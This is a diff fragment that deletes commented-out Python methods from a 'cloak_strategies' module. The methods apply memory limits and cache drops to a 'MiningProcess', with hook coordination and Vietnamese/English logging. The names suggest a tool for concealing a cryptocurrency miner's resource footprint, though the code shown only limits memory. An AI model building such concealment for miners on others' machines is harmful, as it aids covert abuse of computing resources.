-#             pid, name = process.pid, process.name
-
-#             ok_mem = self.memory_resource_manager.set_memory_limit(pid, self.memory_limit_mb)
-#             if not ok_mem:
-#                 self.logger.error(f"[Memory Cloaking] Không thể set memory_limit cho PID={pid}.")
-#                 return False  # ✅ FAILURE: Cannot set memory limit
-            
-#             self.logger.info(f"[Memory Cloaking] PID={pid}, memory_limit={self.memory_limit_mb}MB.")
-
-#             # Cũng có thể drop cache (nếu muốn)
-#             ok_cache = self.cache_resource_manager.drop_caches()
-#             if ok_cache:
-#                 self.logger.info(f"[Memory Cloaking] Đã drop caches cho PID={pid}.")
-            
-#             return True  # ✅ SUCCESS: Memory cloaking applied successfully
-
-#         except psutil.NoSuchProcess as e:
-#             # ✅ ERROR REPORTING: Process not found error
-#             error_reporter.report_error(
-#                 ErrorCode.PROCESS_NOT_FOUND,
-#                 f"Memory Cloaking: Tiến trình không tồn tại: {e}",
-#                 ErrorSeverity.HIGH,
-#                 module='cloak_strategies',
-#                 function='MemoryCloakStrategy.apply',
-#                 process_id=process.pid,
-#                 strategy_name='Memory',
-#                 context_data={'process_name': process.name, 'error': str(e)},
-#                 exception=e
-#             )
-#             self.logger.error(f"Memory Cloaking: Tiến trình không tồn tại: {e}")
-#             return False  # ✅ FAILURE: Process does not exist
-#         except psutil.AccessDenied as e:
-#             # ✅ ERROR REPORTING: Access denied error
-#             error_reporter.report_error(
-#                 ErrorCode.PROCESS_ACCESS_DENIED,
-#                 f"Memory Cloaking: Không đủ quyền cho PID={process.pid}: {e}",
-#                 ErrorSeverity.HIGH,
-#                 module='cloak_strategies',
-#                 function='MemoryCloakStrategy.apply',
-#                 process_id=process.pid,
-#                 strategy_name='Memory',
-#                 context_data={'process_name': process.name, 'error': str(e)},
-#                 exception=e
-#             )
-#             self.logger.error(f"Memory Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
-#             return False  # ✅ FAILURE: Access denied
-#         except Exception as e:
-#             # ✅ ERROR REPORTING: General strategy application failure
-#             error_reporter.report_error(
-#                 ErrorCode.STRATEGY_APPLICATION_FAILED,
-#                 f"Lỗi Memory Cloaking cho {process.name}(PID={process.pid}): {e}",
-#                 ErrorSeverity.HIGH,
-#                 module='cloak_strategies',
-#                 function='MemoryCloakStrategy.apply',
-#                 process_id=process.pid,
-#                 strategy_name='Memory',
-#                 context_data={'process_name': process.name, 'error': str(e), 'stack_trace': traceback.format_exc()},
-#                 exception=e
-#             )
-#             self.logger.error(
-#                 f"Lỗi Memory Cloaking cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
-#             )
-#             return False  # ✅ FAILURE: Memory cloaking failed
-
-#     def apply_with_coordination(self, process: MiningProcess, coordinator, timeout: int = 70) -> bool:
-#         """
-#         **Coordinated Memory Cloaking** (che giấu bộ nhớ có phối hợp)
-        
-#         Apply memory cloaking only after proper hook coordination to prevent
-#         uncoordinated operations that can lead to std::bad_alloc.
-        
-#         Args:
-#             process: MiningProcess object (đối tượng tiến trình khai thác)
-#             coordinator: Hook coordinator instance (thể hiện điều phối hook)
-#             timeout: Coordination timeout in seconds (thời gian chờ phối hợp tính bằng giây)
-            
-#         Returns:
-#             bool: True if coordinated cloaking successful, False if failed/aborted
-#                   (True nếu che giấu có phối hợp thành công, False nếu thất bại/hủy bỏ)
-#         """
-#         try:
-#             pid, name = process.pid, process.name
-            
-#             self.logger.info(f"🔄 [COORDINATED CLOAKING] Starting coordination for PID={pid}, timeout={timeout}s")
-            
-#             # **Critical: Wait for hook coordination** (quan trọng: chờ phối hợp hook)
-#             if not coordinator.wait_for_hooks_ready(pid, timeout):
-#                 # **Coordination failed - ABORT cloaking** (phối hợp thất bại - HỦY che giấu)
-#                 self.logger.error(f"❌ [COORDINATION FAILED] Hook coordination timeout for PID={pid}")
-#                 self.logger.error(f"🚨 [ABORT] Memory cloaking ABORTED to prevent std::bad_alloc")
-#                 self.logger.error(f"💡 [SOLUTION] Increase hook timeout or fix hook coordination system")
-                
-#                 # **Report coordination failure** (báo cáo lỗi phối hợp)
-#                 error_reporter.report_error(
-#                     ErrorCode.STRATEGY_APPLICATION_FAILED,
-#                     f"Hook coordination timeout - Memory cloaking aborted for PID={pid}",
-#                     ErrorSeverity.HIGH,
-#                     module='cloak_strategies',
-#                     function='MemoryCloakStrategy.apply_with_coordination',
-#                     process_id=pid,
-#                     strategy_name='Memory',
-#                     context_data={
-#                         'process_name': name,
-#                         'timeout': timeout,
-#                         'coordination_status': 'FAILED',
-#                         'action': 'ABORTED'
-#                     }
-#                 )
-#                 return False  # **ABORT cloaking** thay vì force proceed
-            
-#             # **Coordination successful - proceed safely** (phối hợp thành công - tiến hành an toàn)
-#             self.logger.info(f"✅ [COORDINATION SUCCESS] Hooks ready for PID={pid} - proceeding with safe cloaking")
-            
-#             # **Apply memory limits with coordination** (áp dụng giới hạn bộ nhớ với phối hợp)
-#             return self.apply_memory_limits(process)
-            
-#         except Exception as e:
-#             # **Error during coordination** (lỗi trong quá trình phối hợp)
-#             error_reporter.report_error(
-#                 ErrorCode.STRATEGY_APPLICATION_FAILED,
-#                 f"Error during coordinated memory cloaking for PID={process.pid}: {e}",
-#                 ErrorSeverity.HIGH,
-#                 module='cloak_strategies',
-#                 function='MemoryCloakStrategy.apply_with_coordination',
-#                 process_id=process.pid,
-#                 strategy_name='Memory',
-#                 context_data={
-#                     'process_name': process.name,
-#                     'error': str(e),
-#                     'stack_trace': traceback.format_exc()
-#                 },
-#                 exception=e
-#             )
-#             self.logger.error(f"❌ [COORDINATION ERROR] Error during coordinated cloaking for PID={process.pid}: {e}")
-#             return False
-    
-#     def apply_memory_limits(self, process: MiningProcess) -> bool:
-#         """
-#         **Apply Memory Limits** (áp dụng giới hạn bộ nhớ)
-        
-#         Internal method to apply memory limits after coordination is confirmed.
-#         This is the actual memory limiting logic extracted from apply() method.
-        
-#         Args:
-#             process: MiningProcess object (đối tượng tiến trình khai thác)
-            
-#         Returns:
-#             bool: True if memory limits applied successfully (True nếu áp dụng giới hạn thành công)
-#         """
-#         try:
-#             pid, name = process.pid, process.name
-            
-#             # **Check if memory limiting is disabled** (kiểm tra nếu giới hạn bộ nhớ bị tắt)
-#             if self.memory_limit_mb <= 0:
-#                 self.logger.info(f"ℹ️ [MEMORY LIMITS] Memory limiting disabled (limit={self.memory_limit_mb}MB)")
-#                 return True  # **Success: No limits to apply** (thành công: không có giới hạn để áp dụng)
-            
-#             # **Apply memory limit** (áp dụng giới hạn bộ nhớ)
-#             ok_mem = self.memory_resource_manager.set_memory_limit(pid, self.memory_limit_mb)
-#             if not ok_mem:
-#                 self.logger.error(f"❌ [MEMORY LIMITS] Cannot set memory limit for PID={pid}")
-#                 return False
-            
-#             self.logger.info(f"✅ [MEMORY LIMITS] Applied limit: PID={pid}, limit={self.memory_limit_mb}MB")
-            
-#             # **Drop caches for memory optimization** (xóa cache để tối ưu bộ nhớ)
-#             ok_cache = self.cache_resource_manager.drop_caches()
-#             if ok_cache:
-#                 self.logger.info(f"🧹 [CACHE CLEANUP] Dropped caches for PID={pid}")
-#             else:
-#                 self.logger.warning(f"⚠️ [CACHE CLEANUP] Failed to drop caches for PID={pid}")
-            
-#             return True  # **Success: Memory limits applied** (thành công: đã áp dụng giới hạn bộ nhớ)
-            
-#         except psutil.NoSuchProcess as e:
-#             self.logger.error(f"❌ [MEMORY LIMITS] Process not found: PID={process.pid}, error={e}")
-#             return False
-#         except psutil.AccessDenied as e:
-#             self.logger.error(f"❌ [MEMORY LIMITS] Access denied: PID={process.pid}, error={e}")
-#             return False
-#         except Exception as e:
-#             self.logger.error(f"❌ [MEMORY LIMITS] Unexpected error: PID={process.pid}, error={e}")
-#             return False
-
-#     def restore(self, process: MiningProcess) -> None:
-#         """
-#         Khôi phục Memory - CHÚ Ý: Tính năng restore đã bị vô hiệu hóa trong phiên bản này.
-#         """
-#         self.logger.info(f"[MEMORY RESTORE DISABLED] Restore request for PID={process.pid} bị bỏ qua - chế độ chỉ cloaking.")
-
-###############################################################################
-#                         ✅ ERROR RECOVERY SYSTEM                         #
-###############################################################################
 
 def _register_strategy_recovery_handlers() -> None:
     """
